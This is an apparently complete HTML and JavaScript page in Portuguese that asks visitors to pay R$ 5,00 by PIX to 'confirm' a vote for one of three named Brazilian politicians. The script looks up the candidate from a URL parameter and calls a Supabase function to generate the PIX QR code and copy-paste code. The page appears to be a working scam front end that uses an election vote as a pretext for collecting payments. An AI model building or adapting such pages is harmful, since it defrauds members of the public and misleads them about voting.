```html
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Pagamento do voto</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #f4f6f8;
      color: #222;
    }

    .container {
      width: 100%;
      max-width: 520px;
      margin: 0 auto;
      padding: 25px 15px 50px;
    }

    .card {
      background: #fff;
      border-radius: 18px;
      padding: 25px;
      box-shadow: 0 5px 25px rgba(0, 0, 0, 0.08);
    }

    .logo {
      text-align: center;
      font-size: 42px;
      margin-bottom: 8px;
    }

    h1 {
      text-align: center;
      margin: 0 0 8px;
      font-size: 25px;
    }

    .subtitle {
      text-align: center;
      color: #666;
      margin-bottom: 25px;
      line-height: 1.5;
    }

    .choice {
      background: #f1f5f9;
      border-radius: 12px;
      padding: 15px;
      margin-bottom: 20px;
    }

    .choice-label {
      font-size: 13px;
      color: #64748b;
      margin-bottom: 5px;
    }

    .choice-name {
      font-size: 20px;
      font-weight: bold;
      color: #111827;
    }

    .value-label {
      text-align: center;
      color: #666;
      font-size: 13px;
      margin-top: 5px;
    }

    .value {
      text-align: center;
      font-size: 34px;
      font-weight: bold;
      margin: 4px 0 25px;
      color: #111;
    }

    .status {
      padding: 16px;
      border-radius: 10px;
      margin-top: 15px;
      line-height: 1.5;
    }

    .status.loading {
      background: #eff6ff;
      color: #1d4ed8;
    }

    .status.success {
      background: #ecfdf5;
      color: #047857;
    }

    .status.error {
      background: #fef2f2;
      color: #b91c1c;
    }

    .status-title {
      font-weight: bold;
      margin-bottom: 8px;
    }

    .payment-area {
      display: none;
      margin-top: 20px;
    }

    .qr-container {
      text-align: center;
      margin: 20px 0;
    }

    #qrcode {
      width: 220px;
      height: 220px;
      margin: 0 auto;
      background: #fff;
      padding: 10px;
      border-radius: 10px;
      border: 1px solid #ddd;
      object-fit: contain;
    }

    .pix-label {
      font-weight: bold;
      margin-bottom: 8px;
    }

    .pix-code {
      width: 100%;
      min-height: 110px;
      resize: vertical;
      padding: 12px;
      border: 1px solid #d1d5db;
      border-radius: 8px;
      font-size: 12px;
      background: #f9fafb;
      word-break: break-all;
    }

    .copy-button {
      width: 100%;
      border: none;
      background: #111;
      color: #fff;
      padding: 14px;
      border-radius: 8px;
      cursor: pointer;
      font-size: 16px;
      font-weight: bold;
      margin-top: 10px;
    }

    .copy-button:hover {
      opacity: 0.9;
    }

    .footer {
      text-align: center;
      color: #888;
      font-size: 12px;
      margin-top: 20px;
    }

    @media (max-width: 480px) {
      .container {
        padding: 15px 10px 40px;
      }

      .card {
        padding: 20px 15px;
      }

      h1 {
        font-size: 23px;
      }

      .value {
        font-size: 30px;
      }
    }
  </style>
</head>

<body>

  <div class="container">

    <div class="card">

      <div class="logo">📦</div>

      <h1>Finalize seu voto</h1>

      <div class="subtitle">
        Faça o pagamento de <strong>R$ 5,00</strong> via PIX
        para confirmar sua participação.
      </div>

      <div class="choice">
        <div class="choice-label">
          Sua escolha
        </div>

        <div
          class="choice-name"
          id="choiceName">
          Carregando...
        </div>
      </div>

      <div class="value-label">
        Valor para confirmar o voto
      </div>

      <div class="value">
        R$ 5,00
      </div>

      <div
        id="status"
        class="status loading">

        <div class="status-title">
          Processando...
        </div>

        <div id="statusMessage">
          Estamos preparando seu pagamento.
        </div>

      </div>

      <div
        id="paymentArea"
        class="payment-area">

        <div class="qr-container">

          <img
            id="qrcode"
            src=""
            alt="QR Code PIX">

        </div>

        <div class="pix-label">
          PIX copia e cola
        </div>

        <textarea
          id="pixCode"
          class="pix-code"
          readonly></textarea>

        <button
          class="copy-button"
          onclick="copiarPix()">

          📋 Copiar PIX

        </button>

      </div>

    </div>

    <div class="footer">
      Pagamento processado via PIX.
    </div>

  </div>


  <script>

    /*
     * ==========================================================
     * EDGE FUNCTION DO SUPABASE
     * ==========================================================
     */

    const PAYMENT_API_URL =
      "https://gyxuyzsovbvbpixggcet.supabase.co/functions/v1/smart-processor";


    /*
     * ==========================================================
     * VALOR DO VOTO
     * ==========================================================
     */

    const PAYMENT_VALUE = 5.00;


    /*
     * ==========================================================
     * CANDIDATOS
     * ==========================================================
     */

    const CANDIDATOS = {

      "9823e037-4045-40dd-8b5f-a183ea4cdc44": {
        nome: "LULA"
      },

      "1b457898-2a19-4342-a5f6-2a867b07f27c": {
        nome: "FLÁVIO BOLSONARO"
      },

      "4debd19b-bf23-4a04-ae44-daa9c05f6fe3": {
        nome: "RENAN SANTOS"
      }

    };


    /*
     * ==========================================================
     * LER PAYMENT_OPTION_ID
     * ==========================================================
     */

    const params =
      new URLSearchParams(window.location.search);

    const paymentOptionId =
      params.get("payment_option_id");


    /*
     * ==========================================================
     * ELEMENTOS
     * ==========================================================
     */

    const choiceName =
      document.getElementById("choiceName");

    const status =
      document.getElementById("status");

    const paymentArea =
      document.getElementById("paymentArea");

    const pixCode =
      document.getElementById("pixCode");

    const qrcode =
      document.getElementById("qrcode");


    /*
     * ==========================================================
     * STATUS
     * ==========================================================
     */

    function showStatus(type, title, message) {

      status.className =
        "status " + type;

      status.innerHTML = `
        <div class="status-title">
          ${title}
        </div>

        <div>
          ${message}
        </div>
      `;
    }


    /*
     * ==========================================================
     * IDENTIFICAR CANDIDATO
     * ==========================================================
     */

    function identificarEscolha(id) {

      if (!id) {
        return null;
      }

      return CANDIDATOS[id] || null;
    }


    /*
     * ==========================================================
     * INICIAR
     * ==========================================================
     */

    function iniciar() {

      if (!paymentOptionId) {

        choiceName.textContent =
          "Nenhuma escolha foi informada";

        showStatus(
          "error",
          "Não foi possível gerar o pagamento.",
          "Nenhuma opção de voto foi informada."
        );

        return;
      }


      const candidato =
        identificarEscolha(paymentOptionId);


      if (!candidato) {

        choiceName.textContent =
          "Opção desconhecida";

        showStatus(
          "error",
          "Não foi possível gerar o pagamento.",
          "O identificador da opção de voto não corresponde a nenhuma opção cadastrada."
        );

        return;
      }


      choiceName.textContent =
        candidato.nome;


      criarPagamento();

    }


    /*
     * ==========================================================
     * CRIAR PAGAMENTO
     * ==========================================================
     */

    async function criarPagamento() {

      showStatus(
        "loading",
        "Gerando pagamento...",
        "Aguarde enquanto preparamos seu PIX."
      );


      try {

        const response =
          await fetch(PAYMENT_API_URL, {

            method: "POST",

            headers: {
              "Content-Type": "application/json"
            },

            body: JSON.stringify({

              payment_option_id:
                paymentOptionId,

              amount:
                PAYMENT_VALUE

            })

          });


        let data;

        try {

          data =
            await response.json();

        } catch {

          throw new Error(
            "O servidor retornou uma resposta inválida."
          );

        }


        if (!response.ok) {

          throw new Error(
            data.message ||
            data.error ||
            "Não foi possível criar o pagamento."
          );

        }


        /*
         * Aceita success=true quando a Edge Function
         * retornar esse campo.
         */

        if (
          data.success === false
        ) {

          throw new Error(
            data.message ||
            data.error ||
            "O pagamento não pôde ser criado."
          );

        }


        /*
         * ======================================================
         * PIX COPIA E COLA
         * ======================================================
         *
         * Aceitamos alguns nomes comuns para facilitar
         * a integração com a Edge Function.
         */

        const codigoPix =
          data.pix_code ||
          data.pixCode ||
          data.payload ||
          data.encodedImage ||
          data.qr_code_text ||
          data.qrCodeText ||
          "";


        /*
         * ======================================================
         * QR CODE
         * ======================================================
         */

        const qrCode =
          data.qr_code ||
          data.qrCode ||
          data.qr_code_url ||
          data.qrCodeUrl ||
          "";


        /*
         * Se a API devolver uma imagem/base64.
         */

        if (qrCode) {

          if (
            qrCode.startsWith("data:image")
          ) {

            qrcode.src =
              qrCode;

          } else {

            qrcode.src =
              qrCode;

          }

        }


        /*
         * PIX copia e cola.
         */

        if (codigoPix) {

          pixCode.value =
            codigoPix;

        }


        /*
         * Se nenhum dado PIX veio da API,
         * informa o problema.
         */

        if (
          !codigoPix &&
          !qrCode
        ) {

          throw new Error(
            "O pagamento foi processado, mas a API não retornou o QR Code ou o código PIX."
          );

        }


        paymentArea.style.display =
          "block";


        showStatus(
          "success",
          "PIX gerado com sucesso!",
          "Escaneie o QR Code ou copie o código PIX para realizar o pagamento."
        );


      } catch (error) {

        console.error(
          "Erro ao gerar pagamento:",
          error
        );


        showStatus(
          "error",
          "Não foi possível gerar o pagamento.",
          error.message ||
          "Ocorreu um erro ao preparar o PIX."
        );

      }

    }


    /*
     * ==========================================================
     * COPIAR PIX
     * ==========================================================
     */

    async function copiarPix() {

      const codigo =
        pixCode.value.trim();


      if (!codigo) {

        alert(
          "O código PIX ainda não está disponível."
        );

        return;
      }


      try {

        await navigator.clipboard.writeText(
          codigo
        );

        alert(
          "PIX copiado com sucesso!"
        );

      } catch (error) {

        pixCode.focus();

        pixCode.select();

        document.execCommand(
          "copy"
        );

        alert(
          "PIX copiado!"
        );

      }

    }


    /*
     * ==========================================================
     * INICIAR
     * ==========================================================
     */

    iniciar();

  </script>

</body>
</html>
